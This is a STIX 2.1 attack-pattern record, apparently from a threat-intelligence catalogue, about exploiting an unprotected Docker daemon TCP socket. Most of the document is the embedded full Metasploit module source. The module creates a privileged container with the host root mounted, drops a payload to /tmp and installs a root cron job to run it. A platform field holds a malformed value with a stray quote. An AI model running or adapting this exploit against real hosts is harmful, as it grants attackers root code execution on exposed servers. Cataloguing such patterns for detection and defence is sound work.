{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7df3d740-aa46-4182-8656-e38b9ac6f26b",
    "created": "2024-08-14T17:02:07.540837Z",
    "modified": "2024-08-14T17:02:07.540841Z",
    "name": "Docker Daemon - Unprotected TCP Socket Exploit",
    "description": " Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a Docker container with the '/' path mounted with read/write permissions on the host server that is running the Docker container. As the Docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owned by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server.  The Docker image should exist on the target system or be a valid image from hub.docker.com. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/docker_daemon_tcp.rb",
            "external_id": "docker_daemon_tcp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface"
        },
        {
            "source_name": "reference",
            "url": "https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'             => 'Docker Daemon - Unprotected TCP Socket Exploit',\n      'Description'      => %q{\n        Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp\n        with tls but without tls-auth), an attacker can create a Docker\n        container with the '/' path mounted with read/write permissions on the\n        host server that is running the Docker container. As the Docker\n        container executes command as uid 0 it is honored by the host operating\n        system allowing the attacker to edit/create files owned by root. This\n        exploit abuses this to creates a cron job in the '/etc/cron.d/' path of\n        the host server.\n\n        The Docker image should exist on the target system or be a valid image\n        from hub.docker.com.\n      },\n      'Author'           => 'Martin Pizala', # started with dcos_marathon module from Erik Daguerre\n      'License'          => MSF_LICENSE,\n      'References'       => [\n        ['URL', 'https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface'],\n        ['URL', 'https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket']\n      ],\n      'DisclosureDate'   => '2017-07-25',\n      'Targets'          => [\n        [ 'Linux x64', {\n          'Arch'         => ARCH_X64,\n          'Platform'     => 'linux'\n        }],\n        [ 'Python', {\n          'Arch'         => ARCH_PYTHON,\n          'Platform'     => 'python',\n          'Payload'      => {\n            'Compat'     => {\n              'ConnectionType' => 'reverse noconn none tunnel'\n            }\n          }\n        }]\n      ],\n      'Payload'          => { 'Space' => 65000, 'DisableNops' => true },\n      'DefaultOptions'   => { 'WfsDelay' => 180 },\n      'DefaultTarget'    => 0))\n\n    register_options(\n      [\n        Opt::RPORT(2375),\n        OptString.new('DOCKERIMAGE', [ true, 'hub.docker.com image to use', 'alpine:latest' ]),\n        OptString.new('CONTAINER_ID', [ false, 'container id you would like'])\n      ]\n    )\n  end\n\n  def check_image(image_id)\n    vprint_status(\"Check if images exist on the target host\")\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => normalize_uri('images', 'json'),\n      'ctype'   => 'application/json'\n    )\n    return unless res && res.code == 200 && res.body.include?(image_id)\n\n    res\n  end\n\n  def pull_image(image_id)\n    print_status(\"Trying to pulling image from docker registry, this may take a while\")\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri('images', 'create?fromImage=' + image_id),\n      'ctype'   => 'application/json'\n    )\n    return unless res && res.code == 200\n\n    res\n  end\n\n  def make_container_id\n    return datastore['CONTAINER_ID'] unless datastore['CONTAINER_ID'].nil?\n\n    rand_text_alpha_lower(8)\n  end\n\n  def make_cmd(mnt_path, cron_path, payload_path)\n    vprint_status('Creating the docker container command')\n    echo_cron_path = mnt_path + cron_path\n    echo_payload_path = mnt_path + payload_path\n\n    case target\n    when targets[0] # linux\n      command = \"echo #{Rex::Text.encode_base64(payload.encoded_exe)} | base64 -d > #{echo_payload_path} \\&\\& chmod +x #{echo_payload_path} \\&\\& \"\n      cron_command = payload_path\n    when targets[1] # python\n      command = \"echo \\\"#{payload.raw}\\\" >> #{echo_payload_path} \\&\\& \"\n      cron_command = \"python #{payload_path}\"\n    end\n\n    command << \"echo \\\"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\\\" >> #{echo_cron_path} \\&\\& \"\n    command << \"echo \\\"\\\" >> #{echo_cron_path} \\&\\& \"\n    command << \"echo \\\"* * * * * root #{cron_command}\\\" >> #{echo_cron_path}\"\n\n    command\n  end\n\n  def make_container(mnt_path, cron_path, payload_path)\n    vprint_status('Setting container json request variables')\n    {\n      'Image'       => datastore['DOCKERIMAGE'],\n      'Cmd'         => make_cmd(mnt_path, cron_path, payload_path),\n      'Entrypoint'  => %w[/bin/sh -c],\n      'HostConfig' => {\n        'Binds'    => [\n          '/:' + mnt_path\n        ],\n        'Privileged' => true,\n        'UsernsMode' => 'host'\n      }\n    }\n  end\n\n  def del_container(container_id)\n    send_request_cgi(\n      {\n        'method'  => 'DELETE',\n        'uri'     => normalize_uri('containers', container_id),\n        'ctype'   => 'application/json'\n      },\n      1 # timeout\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => normalize_uri('containers', 'json'),\n      'ctype'    => 'application/json',\n      'headers'  => { 'Accept' => 'application/json' }\n    )\n\n    if res.nil?\n      print_error('Failed to connect to the target')\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res && res.code == 200 && res.headers['Server'].include?('Docker')\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # check if target is vulnerable\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::Unknown, 'Failed to connect to the target')\n    end\n\n    # check if image is not available, pull it or fail out\n    image_id = datastore['DOCKERIMAGE']\n    if check_image(image_id).nil?\n      fail_with(Failure::Unknown, 'Failed to pull the docker image') if pull_image(image_id).nil?\n    end\n\n    # create required information to create json container information.\n    cron_path = '/etc/cron.d/' + rand_text_alpha(8)\n    payload_path = '/tmp/' + rand_text_alpha(8)\n    mnt_path = '/mnt/' + rand_text_alpha(8)\n    container_id = make_container_id\n\n    # create container\n    res_create = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri('containers', 'create?name=' + container_id),\n      'ctype'   => 'application/json',\n      'data'    => make_container(mnt_path, cron_path, payload_path).to_json\n    )\n    fail_with(Failure::Unknown, 'Failed to create the docker container') unless res_create && res_create.code == 201\n\n    print_status(\"The docker container is created, waiting for deploy\")\n    register_files_for_cleanup(cron_path, payload_path)\n\n    # start container\n    send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri'     => normalize_uri('containers', container_id, 'start'),\n        'ctype'   => 'application/json'\n      },\n      1 # timeout\n    )\n\n    # wait until container stopped\n    vprint_status(\"Waiting until the docker container stopped\")\n    res_wait = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri('containers', container_id, 'wait'),\n      'ctype'   => 'application/json',\n      'headers' => { 'Accept' => 'application/json' }\n    )\n\n    # delete container\n    deleted_container = false\n    if res_wait && res_wait.code == 200\n      vprint_status(\"The docker container has been stopped, now trying to remove it\")\n      del_container(container_id)\n      deleted_container = true\n    end\n\n    # if container does not deploy, remove it and fail out\n    unless deleted_container\n      del_container(container_id)\n      fail_with(Failure::Unknown, \"The docker container failed to deploy\")\n    end\n    print_status('Waiting for the cron job to run, can take up to 60 seconds')\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-25",
    "x_mitre_platforms": [
        "python'"
    ]
}